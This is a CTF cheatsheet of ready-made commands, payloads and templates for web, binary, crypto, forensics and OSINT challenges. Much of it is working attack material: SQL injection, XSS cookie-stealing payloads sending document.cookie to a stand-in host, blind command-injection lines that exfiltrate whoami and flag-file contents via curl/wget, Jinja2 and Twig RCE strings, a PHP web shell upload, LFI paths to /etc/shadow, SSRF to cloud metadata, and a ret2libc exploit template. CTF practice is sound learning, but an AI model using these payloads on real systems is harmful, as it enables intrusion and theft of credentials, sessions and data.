# 🚩 CTF Cheatsheet — Pre-Built Commands, Payloads & Strategies

> **How to use this:** Jump to your domain, enumerate first, then go deeper.
> Always run `file`, `strings`, and `xxd` on any unknown file before assuming anything.

---

## 📑 Table of Contents

1. [General Recon & First Steps](#1-general-recon--first-steps)
2. [Web Exploitation](#2-web-exploitation)
3. [Cryptography](#3-cryptography)
4. [Binary Exploitation (Pwn)](#4-binary-exploitation-pwn)
5. [Reverse Engineering](#5-reverse-engineering)
6. [Forensics](#6-forensics)
7. [Steganography](#7-steganography)
8. [OSINT](#8-osint)
9. [Networking & PCAP](#9-networking--pcap)
10. [Code Templates](#10-code-templates)
11. [Tools Master List](#11-tools-master-list)
12. [CTF Mindset & Strategy](#12-ctf-mindset--strategy)

---

## 1. General Recon & First Steps

```bash
# Identify file type regardless of extension
file suspicious_file

# Dump readable strings (min length 8 to reduce noise)
strings -n 8 suspicious_file

# Hex dump — check magic bytes, find hidden data
xxd suspicious_file | head -50
xxd suspicious_file | grep -i "flag\|ctf\|png\|zip"

# Entropy analysis (high entropy = compressed/encrypted)
binwalk -E suspicious_file

# Extract embedded files
binwalk -e --dd='.*' suspicious_file

# Check for hidden metadata
exiftool suspicious_file

# Base64 check
echo "string_here" | base64 -d
cat file | base64 -d

# Recursive strings in a folder
find . -type f | xargs strings -n 6 | grep -i "flag\|ctf{"
```

**Magic Bytes Cheatsheet:**

| Format | Magic Bytes (hex) |
|--------|-------------------|
| PNG    | `89 50 4E 47` |
| JPEG   | `FF D8 FF` |
| ZIP    | `50 4B 03 04` |
| PDF    | `25 50 44 46` |
| ELF    | `7F 45 4C 46` |
| GIF    | `47 49 46 38` |
| 7ZIP   | `37 7A BC AF 27 1C` |

---

## 2. Web Exploitation

### 🔍 Enumeration First

```bash
# Directory brute-force
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Always check these manually
curl http://target.com/robots.txt
curl http://target.com/.git/config
curl http://target.com/.env
curl http://target.com/sitemap.xml
curl http://target.com/backup.zip
curl http://target.com/admin

# Headers inspection
curl -I http://target.com
curl -v http://target.com 2>&1 | grep -i "header\|cookie\|set-cookie\|location"

# Subdomain enumeration
ffuf -u http://FUZZ.target.com -w /usr/share/wordlists/subdomains.txt
```

### 💉 SQL Injection

```sql
-- Basic auth bypass
' OR 1=1 --
' OR 'a'='a
admin'--
' OR 1=1#

-- UNION-based (find column count first)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract data
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- Blind SQLi (boolean)
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND SUBSTRING(username,1,1)='a'--

-- Error-based
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

-- sqlmap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
```

### 🖥️ XSS Payloads

```javascript
// Basic reflected XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

// Cookie stealing
<script>document.location='http://yourserver.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://yourserver.com/?c='+document.cookie)">

// Filter bypass
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
javascript:alert(1)
<details open ontoggle=alert(1)>
```

### 🗂️ LFI / Path Traversal

```bash
# Basic traversal
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php

# Useful files to grab
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/www/html/config.php
/home/user/.bash_history

# PHP wrappers
php://filter/convert.base64-encode/resource=config
php://input   (POST body as PHP)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
```

### 💻 Command Injection

```bash
# Basic payloads
; ls
| ls
&& ls
`ls`
$(ls)
; cat /etc/passwd
; cat /flag.txt

# Filter bypass
c''at /flag.txt
cat$IFS/flag.txt
ca\t /flag.txt
/???/??t /flag.txt   # glob

# Blind command injection (OOB)
; ping -c 1 yourserver.com
; curl http://yourserver.com/$(whoami)
; wget http://yourserver.com/?x=$(cat /flag.txt | base64)
```

### 🔒 SSTI (Server-Side Template Injection)

```
# Detection
{{7*7}}       → 49 (Jinja2/Twig)
${7*7}        → 49 (FreeMarker)
<%= 7*7 %>    → 49 (ERB/Ruby)
#{7*7}        → 49 (Pug/Slim)

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 🔓 JWT Attacks

```bash
# Decode JWT (without verification)
echo "eyJ..." | cut -d'.' -f2 | base64 -d

# None algorithm attack — change alg to "none", remove signature
# Header: {"alg":"none","typ":"JWT"}
python3 -c "import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"

# JWT secret cracking
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

### 🔑 Other Web Tricks

```bash
# SSRF payloads
http://localhost/admin
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/   # AWS metadata
http://0x7f000001/                          # hex IP
http://2130706433/                          # decimal IP
http://[::1]/                              # IPv6

# Open Redirect
?redirect=https://evil.com
?url=//evil.com
?next=\evil.com

# XXE
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

# HTTP Request Smuggling (CL.TE)
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 6
3
abc
0
```

---

## 3. Cryptography

### 🔎 Cipher Identification

```
- Only uppercase + spaces → Caesar / Vigenere
- Only A-Z, no spaces    → Rail fence / Columnar
- = at end               → Base64
- Lots of symbols        → Substitution cipher
- Groups of 5 chars      → Classic cipher
- Binary / hex strings   → Encoding, not encryption
- Large numbers (e,n,c)  → RSA
- Repeated blocks        → ECB mode (block cipher)
```

### 🔐 Classical Ciphers

```python
# Caesar brute-force (Python)
ciphertext = "KHOOR ZRUOG"
for shift in range(26):
    decrypted = ''.join(chr((ord(c) - ord('A') - shift) % 26 + ord('A')) if c.isalpha() else c for c in ciphertext.upper())
    print(f"Shift {shift}: {decrypted}")

# ROT13
import codecs
codecs.decode("lbhe_synt_urer", 'rot_13')

# XOR brute force (single byte)
data = bytes.fromhex("1a2b3c4d5e")
for key in range(256):
    result = bytes([b ^ key for b in data])
    if b'flag' in result.lower() or all(32 <= x < 127 for x in result):
        print(f"Key {key}: {result}")

# XOR with known key
key = b"secret"
ct = bytes.fromhex("...")
pt = bytes([ct[i] ^ key[i % len(key)] for i in range(len(ct))])
```

### 🔒 RSA Attacks

```python
# Small e, large m → cube root attack (e=3)
import gmpy2
c = int("...")
n = int("...")
e = 3
m, exact = gmpy2.iroot(c, e)
print(bytes.fromhex(hex(m)[2:]))

# Factorize n if small (try factordb.com first)
# p*q=n → φ(n) = (p-1)(q-1) → d = e^-1 mod φ(n) → m = c^d mod n
from Crypto.Util.number import inverse, long_to_bytes
p = ...
q = ...
e = 65537
c = ...
n = p * q
phi = (p-1) * (q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))

# Common modulus attack (same n, different e, different c for same m)
# Extended GCD to find s1, s2 where s1*e1 + s2*e2 = 1
# m = (c1^s1 * c2^s2) mod n

# Wiener's attack (small d) → use owiener library
import owiener
d = owiener.attack(e, n)
```

### 🔑 Encoding Quick Reference

```bash
# Base64
echo "dGVzdA==" | base64 -d
echo "test" | base64

# Base32
echo "ORSXG5A=" | base32 -d

# Hex
echo "74657374" | xxd -r -p
echo -n "test" | xxd -p

# URL encode/decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%74%65%73%74'))"
python3 -c "import urllib.parse; print(urllib.parse.quote('test string'))"

# HTML entities
python3 -c "import html; print(html.unescape('&lt;script&gt;'))"
```

### 🧮 Hashing

```bash
# Identify hash
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# Crack hashes
hashcat -a 0 -m 0 hash.txt rockyou.txt       # MD5
hashcat -a 0 -m 100 hash.txt rockyou.txt     # SHA1
hashcat -a 0 -m 1800 hash.txt rockyou.txt    # sha512crypt
john --wordlist=rockyou.txt hash.txt

# Hash type codes (hashcat -m)
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 1700 = SHA512
# 1800 = sha512crypt ($6$)
# 3200 = bcrypt
# 5600 = NetNTLMv2

# Online: crackstation.net, md5decrypt.net
```

---

## 4. Binary Exploitation (Pwn)

### 🔍 Recon

```bash
# Check protections
checksec --file=./binary
# NX = no shellcode on stack
# PIE = randomized base address
# RELRO = GOT write protection
# Canary = stack smashing protection

# Run and observe
strace ./binary       # system calls
ltrace ./binary       # library calls
gdb ./binary

# Basic GDB commands
gdb ./binary
(gdb) run
(gdb) info functions
(gdb) disas main
(gdb) break *0x401234
(gdb) x/20wx $esp      # examine memory
(gdb) x/s 0x402000     # examine as string
(gdb) info registers

# GDB with pwndbg
b main
r
context        # view stack/regs
telescope $rsp # examine stack
```

### 💥 Buffer Overflow

```bash
# Find offset with cyclic pattern
python3 -c "from pwn import *; print(cyclic(200))" | ./binary
# After crash, find offset:
python3 -c "from pwn import *; print(cyclic_find(0x61616171))"

# OR with msf-pattern
msf-pattern_create -l 200
msf-pattern_offset -q 0x61616171

# Basic BOF exploit template → see Code Templates section

# Find ROP gadgets
ROPgadget --binary ./binary
ropper -f ./binary
# Common gadgets:
# pop rdi; ret      → set first argument
# pop rsi; ret      → set second argument
# pop rdx; ret      → set third argument
# ret               → stack alignment (needed for system() on 64-bit)
```

### 🛠️ Format String

```bash
# Detect format string vuln
./binary <<< "%x %x %x %x"    # if you see hex values → vulnerable

# Leak stack values
%1$x %2$x %3$x ... %n$x
printf "%p %p %p %p %p %p")

# Read arbitrary address
python3 -c "import struct; print(struct.pack('<Q', 0x601020) + b'|%8\$s|')"

# Write arbitrary value (overwrite GOT)
# Use pwntools fmtstr_payload()
```

### 🐍 Pwntools Quick Reference

```python
from pwn import *

# Connect
p = process('./binary')
p = remote('host', port)

# Interact
p.sendline(b'payload')
p.send(b'payload')
p.recvuntil(b'prompt: ')
p.recv(1024)
p.recvline()
p.interactive()

# Pack addresses
p64(0xdeadbeef)   # 64-bit little endian
p32(0xdeadbeef)   # 32-bit little endian

# ELF operations
elf = ELF('./binary')
elf.symbols['main']        # symbol address
elf.got['puts']            # GOT address
elf.plt['puts']            # PLT address

# Libc
libc = ELF('./libc.so.6')
# After leaking libc base:
libc.address = leaked_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
```

---

## 5. Reverse Engineering

### 🔍 Static Analysis

```bash
# First look
file binary
strings binary | grep -i "flag\|ctf\|pass\|key\|secret"
strings binary | grep -E "[A-Za-z0-9+/]{20,}={0,2}"   # base64 candidates

# Symbol information
nm binary
readelf -s binary
objdump -d binary | head -100

# Import/Export table
objdump -T binary
readelf -d binary | grep NEEDED   # shared libs

# Decompile with Ghidra (GUI) or:
# radare2
r2 binary
[0x0]> aaa        # analyze all
[0x0]> afl        # list functions
[0x0]> s main     # seek to main
[0x0]> pdf        # print disassembly
[0x0]> pdc        # pseudo-C decompile
```

### 🐛 Dynamic Analysis

```bash
# Trace execution
strace -e trace=all ./binary
ltrace ./binary
strace -f ./binary 2>&1 | grep -i "flag\|open\|read"

# GDB tricks
gdb ./binary
(gdb) set disassembly-flavor intel
(gdb) catch syscall      # break on all syscalls
(gdb) watch *(int*)0x601020   # watchpoint on address

# Patch binary (flip a jump)
# In GDB: set {unsigned char}0x401234 = 0x90  (NOP)
# In hex editor: change 74 (je) to 75 (jne) or EB (jmp)
```

### 🐍 Python / Script Reversing

```python
# Decompile .pyc
uncompyle6 file.pyc > file.py
# OR
pycdc file.pyc

# Deobfuscate common tricks
import dis
dis.dis(compile(open('file.py').read(), 'file.py', 'exec'))
```

### ☕ Java / Android

```bash
# Decompile JAR
jadx-gui file.apk
# or
jar xf file.jar
javap -c com/example/Main.class

# APK analysis
apktool d app.apk
jadx app.apk
strings classes.dex | grep -i flag
```

---

## 6. Forensics

### 🗃️ File Analysis

```bash
# Full triage
file unknown
xxd unknown | head -30
strings -n 8 unknown | head -50
exiftool unknown
binwalk -e unknown

# Recover deleted files
foremost -i disk.img -o output/
photorec disk.img

# Disk image mount
sudo mount -o loop disk.img /mnt/usb
# or
fdisk -l disk.img      # find partition offset
sudo mount -o loop,offset=$((512*2048)) disk.img /mnt/

# Filesystem
fls -r disk.img        # list files (incl. deleted)
icat disk.img 42       # extract inode 42
```

### 📦 Archive Tricks

```bash
# Password-cracked zip
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
# or
hashcat -a 0 -m 13600 zip.hash rockyou.txt
fcrackzip -u -D -p rockyou.txt protected.zip

# Corrupt zip fix
zip -FF corrupted.zip --out fixed.zip
```

### 🧠 Memory Forensics (Volatility)

```bash
# Identify profile
volatility -f memory.dmp imageinfo
volatility2 -f memory.dmp --profile=Win7SP1x64 pslist

# Key commands
volatility -f mem.dmp --profile=Win7SP1x64 pslist        # process list
volatility -f mem.dmp --profile=Win7SP1x64 pstree        # process tree
volatility -f mem.dmp --profile=Win7SP1x64 cmdscan       # cmd history
volatility -f mem.dmp --profile=Win7SP1x64 filescan      # file list
volatility -f mem.dmp --profile=Win7SP1x64 dumpfiles -Q 0x... -D out/
volatility -f mem.dmp --profile=Win7SP1x64 hashdump      # NTLM hashes
volatility -f mem.dmp --profile=Win7SP1x64 clipboard     # clipboard
volatility -f mem.dmp --profile=Win7SP1x64 screenshot -D out/

# Volatility 3 (no profile needed)
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.cmdline
```

---

## 7. Steganography

### 🖼️ Images

```bash
# First checks
file image.png
exiftool image.png
strings image.png | grep -i "flag\|ctf"
xxd image.png | grep -i "flag"

# LSB steganography
zsteg image.png              # PNG/BMP lsb
zsteg -a image.png           # try all methods
steghide extract -sf image.jpg -p ""          # no password
steghide extract -sf image.jpg -p password

# Stegsolve (Java GUI)
java -jar stegsolve.jar

# pngcheck for corrupt PNG
pngcheck -v image.png

# Compare two images
compare -metric AE image1.png image2.png diff.png
# or pixel difference in Python:
python3 -c "
from PIL import Image
img1 = Image.open('img1.png')
img2 = Image.open('img2.png')
pixels1 = list(img1.getdata())
pixels2 = list(img2.getdata())
diff = [abs(a-b) for a,b in zip([p for px in pixels1 for p in px], [p for px in pixels2 for p in px])]
print(diff[:50])
"

# Outguess
outguess -r image.jpg output.txt

# JPEG
jsteg reveal image.jpg
stegoveritas image.jpg
```

### 🔊 Audio

```bash
# Spectogram analysis (open in Audacity or Sonic Visualizer)
# Look for visual patterns in spectrogram view

# Extract hidden data
mp3stego-decode -X file.mp3
steghide extract -sf file.wav

# Morse code from audio → decode manually or use online tool
# DTMF tones → multimon-ng
multimon-ng -t wav -a DTMF file.wav

# LSB in WAV
python3 -c "
import wave
with wave.open('file.wav','r') as w:
    frames = w.readframes(w.getnframes())
    bits = [frame & 1 for frame in frames]
    chars = [chr(int(''.join(map(str,bits[i:i+8])),2)) for i in range(0,len(bits)-7,8)]
    print(''.join(c for c in chars if 32<=ord(c)<127))
"
```

### 📄 Text / Document Steganography

```bash
# White space steganography
cat -A file.txt | grep -P "[ \t]+$"   # trailing whitespace
stegsnow -C file.txt

# Zero-width characters
cat file.txt | xxd | grep "e2 80\|e2 81\|ef bb"

# Check for hidden text in Word/PDF
strings document.docx
unzip document.docx -d doc_extracted/
cat doc_extracted/word/document.xml | grep -i flag
```

---

## 8. OSINT

### 🔍 Search Strategies

```bash
# Google dorks
site:target.com filetype:pdf
site:target.com inurl:admin
"target.com" filetype:sql
"flag{" site:pastebin.com

# Username search
# → sherlock: sherlock username
# → whatsmyname.net

# Reverse image search
# → images.google.com → upload image
# → tineye.com
# → Yandex images (best for faces)
```

### 🌐 Domain & IP

```bash
whois target.com
dig target.com ANY
dig @8.8.8.8 target.com
nslookup target.com
host target.com

# Subdomains
subfinder -d target.com
amass enum -d target.com
dnsrecon -d target.com

# Historical DNS / data
# → SecurityTrails, ViewDNS.info, Shodan, Censys

# Wayback Machine
curl "https://archive.org/wayback/available?url=target.com"

# Certificate transparency (subdomain leak)
# → crt.sh: https://crt.sh/?q=%25.target.com
```

### 📸 Image OSINT

```bash
exiftool photo.jpg   # GPS coords, device, timestamp
# GPS coords → Google Maps / Google Earth
# → reverse geocode, look for landmarks
```

---

## 9. Networking & PCAP

### 🦈 Wireshark / tshark

```bash
# Follow TCP stream
# Wireshark: Right click packet → Follow → TCP Stream

# tshark one-liners
tshark -r capture.pcap -Y http                       # HTTP only
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name    # DNS queries
tshark -r capture.pcap -Y "tcp.port==4444"           # specific port
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn

# Extract files from PCAP
# Wireshark: File → Export Objects → HTTP
tcpflow -r capture.pcap -C -g    # reassemble TCP streams
networkMiner capture.pcap        # GUI extraction

# Extract credentials
strings capture.pcap | grep -i "pass\|user\|login\|flag"
```

### 🔐 SSL/TLS Decryption

```bash
# If you have the private key:
# Wireshark: Edit → Preferences → Protocols → TLS → RSA Keys → add key

# If you have the master secret log:
# Wireshark: Edit → Preferences → TLS → (Pre)-Master-Secret log filename
```

### 📡 Misc Network

```bash
# Scan host
nmap -sV -sC target.com
nmap -A -p- target.com
nmap -sU target.com      # UDP

# Banner grabbing
nc target.com 80
telnet target.com 25

# SMB
smbclient -L //target.com -N
smbclient //target.com/share -N

# FTP
ftp target.com     (try anonymous:anonymous)
```

---

## 10. Code Templates

### 🐍 Pwntools BOF Template

```python
from pwn import *

# Setup
context.binary = elf = ELF('./binary')
context.arch = 'amd64'   # or 'i386'
# context.log_level = 'debug'

# Connect
p = process('./binary')
# p = remote('host', 1337)

# If need libc
libc = ELF('./libc.so.6')

# Stage 1: Leak libc (ret2plt)
OFFSET = 40          # cyclic offset
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
pop_rdi = 0x401234   # ROPgadget --binary ./binary | grep "pop rdi"
ret     = 0x401235   # for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)   # return to main for stage 2

p.recvuntil(b'input: ')
p.sendline(payload)

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"puts @ {hex(leaked)}")

libc.address = leaked - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
log.info(f"system @ {hex(system)}")

# Stage 2: Get shell
payload2  = b'A' * OFFSET
payload2 += p64(ret)         # alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.recvuntil(b'input: ')
p.sendline(payload2)
p.interactive()
```

### 🔐 RSA Solver Template

```python
from Crypto.Util.number import inverse, long_to_bytes
import gmpy2

# Given values
n = 
e = 
c = 
# p and q (from factordb.com or yafu)
p = 
q = 

# Solve
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

### 🕸️ Web Requests Template

```python
import requests

BASE = "http://target.com"
session = requests.Session()

# Login
r = session.post(f"{BASE}/login", data={"user": "admin", "pass": "' OR 1=1--"})
print(r.status_code, r.text[:200])

# With cookies
session.cookies.set('admin', '1')
r = session.get(f"{BASE}/dashboard")

# Custom headers
headers = {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}
r = session.get(f"{BASE}/admin", headers=headers)

# File upload
files = {'file': ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
r = session.post(f"{BASE}/upload", files=files)

print(r.text)
```

### 🔁 XOR Solver Template

```python
ct = bytes.fromhex("deadbeef1234...")

# Single-byte XOR
for key in range(256):
    pt = bytes([b ^ key for b in ct])
    if b'flag' in pt or b'CTF' in pt:
        print(f"Key: {key} | {pt}")

# Repeating-key XOR (known key)
key = b"secret"
pt = bytes([ct[i] ^ key[i % len(key)] for i in range(len(ct))])
print(pt)

# Repeating-key XOR (unknown key, guess key length via IC/kasiski)
from itertools import cycle
# Try lengths 1-20
for klen in range(1, 21):
    columns = [ct[i::klen] for i in range(klen)]
    key = bytes([max(range(256), key=lambda k: sum((b ^ k) in b' etaoinshrdlu' for b in col)) for col in columns])
    pt = bytes([b ^ key[i % klen] for i, b in enumerate(ct)])
    if all(32 <= c < 127 for c in pt):
        print(f"Key ({klen}): {key} | {pt}")
```

### 🖼️ LSB Steganography Template

```python
from PIL import Image

img = Image.open('image.png')
pixels = list(img.getdata())

bits = []
for pixel in pixels:
    for channel in pixel[:3]:   # RGB
        bits.append(channel & 1)

chars = []
for i in range(0, len(bits), 8):
    byte = int(''.join(map(str, bits[i:i+8])), 2)
    if byte == 0:
        break
    chars.append(chr(byte))

print(''.join(chars))
```

---

## 11. Tools Master List

### 🌐 Web
| Tool | Purpose | Command |
|------|---------|---------|
| Burp Suite | Intercept/modify requests | GUI |
| ffuf | Directory fuzzing | `ffuf -u URL/FUZZ -w wordlist` |
| gobuster | Dir/subdomain brute | `gobuster dir -u URL -w wordlist` |
| sqlmap | SQL injection | `sqlmap -u URL --dbs` |
| nikto | Web scanner | `nikto -h URL` |
| wfuzz | Parameter fuzzing | `wfuzz -c -z file,wordlist URL?param=FUZZ` |
| jwt_tool | JWT attacks | `python3 jwt_tool.py token` |

### 🔐 Crypto
| Tool | Purpose |
|------|---------|
| CyberChef | Swiss army knife encoder/decoder |
| hashcat | GPU hash cracking |
| john | CPU hash cracking |
| RsaCtfTool | Automated RSA attacks |
| dCode.fr | Classical cipher solver (web) |
| factordb.com | Factor large numbers (web) |
| quipqiup.com | Substitution cipher solver (web) |

### 🔬 Forensics / Stego
| Tool | Purpose | Command |
|------|---------|---------|
| binwalk | Firmware analysis | `binwalk -e file` |
| exiftool | Metadata extraction | `exiftool file` |
| foremost | File carving | `foremost -i disk.img -o out/` |
| volatility | Memory forensics | `vol -f mem.dmp windows.pslist` |
| zsteg | PNG/BMP steganography | `zsteg -a image.png` |
| steghide | JPEG steganography | `steghide extract -sf file.jpg` |
| stegsolve | Image bit plane viewer | `java -jar stegsolve.jar` |
| audacity | Audio steganography (visual) | GUI |

### 💥 Pwn / Rev
| Tool | Purpose | Command |
|------|---------|---------|
| GDB + pwndbg | Debugger | `gdb ./binary` |
| pwntools | Exploit framework | `from pwn import *` |
| ROPgadget | Find ROP gadgets | `ROPgadget --binary ./binary` |
| Ghidra | Decompiler | GUI |
| radare2 | Disassembler/debugger | `r2 ./binary` |
| checksec | Check protections | `checksec --file=./binary` |
| ltrace | Library call trace | `ltrace ./binary` |
| strace | Syscall trace | `strace ./binary` |
| jadx | Java/APK decompiler | `jadx-gui app.apk` |

### 🌍 OSINT
| Tool | Purpose |
|------|---------|
| sherlock | Username search |
| subfinder | Subdomain enumeration |
| amass | DNS enumeration |
| theHarvester | Email/subdomain OSINT |
| Shodan | Internet-facing service search |
| crt.sh | Certificate transparency |
| archive.org | Historical web pages |

### 📡 Network
| Tool | Purpose | Command |
|------|---------|---------|
| Wireshark | PCAP analysis | GUI |
| tshark | CLI PCAP analysis | `tshark -r file.pcap` |
| nmap | Port scanner | `nmap -sV -sC target` |
| netcat | Swiss army TCP | `nc host port` |
| tcpflow | Stream reconstruction | `tcpflow -r file.pcap` |

### 🗂️ Wordlists
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Passwords/
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Fuzzing/
```

---

## 12. CTF Mindset & Strategy

### 🧭 Universal First Steps (ALWAYS do these)

```
1. file <challenge_file>
2. strings -n 8 <file>
3. xxd <file> | head -30
4. exiftool <file>
5. binwalk <file>
6. Read the challenge description word by word — hints hide in flavor text
7. Check the file extension vs actual magic bytes
```

### ⏱️ Time Management

```
- Timebox: Max 45 min per challenge before rotating
- Easy challenges first — get the points, build confidence
- Note EVERYTHING you've tried to avoid loops
- If stuck: explain the problem out loud (rubber duck method)
- Fresh eyes after a break find what tired eyes miss
```

### 🧩 "I'm Stuck" Checklist

```
□ Did I read the challenge description again?
□ Did I try all encodings (base64, hex, rot13, url)?
□ Did I check metadata (exiftool)?
□ Did I run binwalk?
□ Did I check for hidden files (stego)?
□ Did I search CTFtime.org for similar challenge names?
□ Did I try the obvious (password="password", admin:admin)?
□ Did I look at the source code / page source?
□ Did I check robots.txt, .git, .env?
□ Did I try null bytes, empty strings, long inputs?
□ Is it perhaps simpler than I think?
```

### 🏷️ Flag Format Regex

```bash
# Common flag formats
grep -rE "CTF\{[^}]+\}" .
grep -rE "flag\{[^}]+\}" .
grep -rE "[A-Z0-9_]+\{[^}]+\}" .

# When you find something encoded
echo "..." | base64 -d | grep -i "ctf\|flag"
```

### 🔗 Essential Online Resources

```
CyberChef        → gchq.github.io/CyberChef
CTFtime          → ctftime.org/writeups
factordb         → factordb.com
dCode            → dcode.fr
CrackStation     → crackstation.net
Shodan           → shodan.io
crt.sh           → crt.sh
URL/Base decoder → dencode.com
Decompile online → dogbolt.org (multi-decompiler)
Java decompile   → decompiler.com
```

---

*Good luck. Enumerate everything. Trust the process. 🚩*
